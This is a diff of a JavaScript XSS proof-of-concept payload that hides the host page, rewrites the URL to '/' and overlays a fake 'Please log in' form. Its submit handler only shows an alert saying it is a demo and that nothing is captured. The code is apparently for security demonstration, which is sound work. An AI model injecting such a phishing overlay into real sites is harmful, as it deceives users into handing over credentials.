@@ -1,15 +1,19 @@
 (() => {
   /* ---------------- Config ---------------- */
-  const DEFAULTS = { _replaceBackground: true, _urlRewrite: true };
+  const DEFAULTS = { _replaceBackground: true, _rewriteUrl: true };
   const truthy = v => (typeof v === 'boolean') ? v : !/^(0|false|no|off)$/i.test(String(v ?? '').trim());
+
+  // Parse "a=1&b=2"
   const parseKV = s => (s||'').replace(/^[?#]/,'').split('&').filter(Boolean).reduce((o,p)=>{
-    const i=p.indexOf('='), k=decodeURIComponent(i>-1?p.slice(0,i):p), v=decodeURIComponent(i>-1?p.slice(i+1):'1'); o[k]=v; return o;
+    const i=p.indexOf('='), k=decodeURIComponent(i>-1?p.slice(0,i):p), v=decodeURIComponent(i>-1?p.slice(i+1):'1'); 
+    o[k]=v; return o;
   }, {});
   const urlParams = { ...parseKV(location.search), ...parseKV(location.hash) };
-  const globals = { _replaceBackground: window._replaceBackground, _urlRewrite: window._urlRewrite };
+  const globals = { _replaceBackground: window._replaceBackground, _rewriteUrl: window._rewriteUrl };
+
   const opts = {
     _replaceBackground: truthy(urlParams._replaceBackground ?? globals._replaceBackground ?? DEFAULTS._replaceBackground),
-    _urlRewrite:        truthy(urlParams._urlRewrite        ?? globals._urlRewrite        ?? DEFAULTS._urlRewrite)
+    _rewriteUrl:        truthy(urlParams._rewriteUrl        ?? globals._rewriteUrl        ?? DEFAULTS._rewriteUrl)
   };
 
   /* ---------------- Utilities ---------------- */
@@ -18,16 +22,16 @@
   const imp = (el, k, v) => el.style.setProperty(k, v, 'important');
   const add = (tag, parent = document.documentElement) => parent.appendChild(document.createElement(tag));
 
-  /* ---------------- Instant white overlay (prevents flicker) ---------------- */
+  /* ---------------- White overlay ---------------- */
   (() => {
     const o = add('div');
     o.id = 'xssWhite';
     o.style.cssText = 'position:fixed;inset:0;background:#fff;opacity:1;z-index:2147483647;transition:opacity .2s linear;pointer-events:all;';
   })();
 
-  /* ---------------- Host suppression (only when _replaceBackground=1) ---------------- */
+  /* ---------------- Host suppression if replaceBackground ---------------- */
   const suppressHost = () => {
-    if (!opts._replaceBackground) return;        // <-- key change
+    if (!opts._replaceBackground) return;
     if (!document.body) return;
     ['opacity','0','visibility','hidden','pointer-events','none','position','fixed',
      'top','-10000px','left','-10000px','width','1px','height','1px','overflow','hidden',
@@ -38,7 +42,6 @@
   };
   if (document.body) suppressHost(); else document.addEventListener('DOMContentLoaded', suppressHost);
 
-  // Kill CSS + Observer only in suppress mode
   if (opts._replaceBackground) {
     const kill = add('style'); kill.id = 'xssKill';
     kill.textContent =
@@ -56,10 +59,10 @@
     }).observe(document.documentElement, { childList:true, subtree:true });
   }
 
-  /* ---------------- Init (earlier of DOMContentLoaded+1000ms or +1500ms) ---------------- */
+  /* ---------------- Init ---------------- */
   const init = () => {
     if (started) return; started = true;
-    if (opts._urlRewrite) { try { history.pushState(null, '', '/'); } catch {} }
+    if (opts._rewriteUrl) { try { history.pushState(null, '', '/'); } catch {} }
 
     const root = add('div'); root.id = 'xssRoot';
     root.innerHTML = `
@@ -67,9 +70,7 @@
         .xss-root{position:fixed;inset:0;z-index:2147483000;font-family:Arial,Helvetica,sans-serif}
         .xss-bg{position:absolute;inset:0;}
         .xss-bg iframe{width:100%;height:100%;border:0;opacity:.9;transition:opacity .5s}
-        /* IMPORTANT: when keeping original page, the dim layer must block clicks */
         .xss-dim{position:absolute;inset:0;background:#000;opacity:0;transition:opacity .5s;pointer-events:auto}
-        /* Force white text inside modal */
         .xss-modal,.xss-modal *{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;color:#fff!important}
         .xss-modal{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) scale(.96);opacity:0;transition:opacity .5s,transform .5s;width:420px;background:rgba(0,0,0,.88);padding:28px;border-radius:12px;box-shadow:0 12px 36px rgba(0,0,0,.55);font-size:18px;line-height:1.4}
         .xss-modal h2{margin:0 0 16px;font-size:26px}
@@ -88,7 +89,7 @@
         <div class="xss-bg">
           ${opts._replaceBackground ? `<iframe src="/" title="root-bg"></iframe>` : ``}
         </div>
-        <div class="xss-dim" ${opts._replaceBackground ? '' : ''}></div>
+        <div class="xss-dim"></div>
         <form class="xss-modal" id="xssForm" autocomplete="off">
           <h2 style="color:#ff3b30">Please log in</h2>
           <div class="xss-field"><label class="xss-label" for="xssUser">Username</label>
@@ -101,23 +102,20 @@
         </form>
       </div>`;
 
-    // If we DIDN'T replace background, ensure the host is visible (we never hid it),
-    // and rely on .xss-dim to block clicks and provide the dim effect.
-
-    // Fade out the initial white overlay
+    // Remove overlay
     const white = document.getElementById('xssWhite');
     if (white) { white.style.opacity = '0'; setTimeout(() => white.remove(), 220); }
 
-    // After 1000ms: begin dim + popup reveal (0.5s transitions)
+    // Fade-in after 1000ms
     setTimeout(() => document.getElementById('xssStage')?.classList.add('xss-show'), 1000);
 
-    // Demo submit
     root.querySelector('#xssForm').addEventListener('submit', e => {
       e.preventDefault();
       alert('This is an XSS demo (no data has been captured by it)');
     });
   };
 
+  // Race init triggers
   const domReady = () => setTimeout(init, 1000);
   (document.readyState === 'loading')
     ? document.addEventListener('DOMContentLoaded', domReady, { once:true })
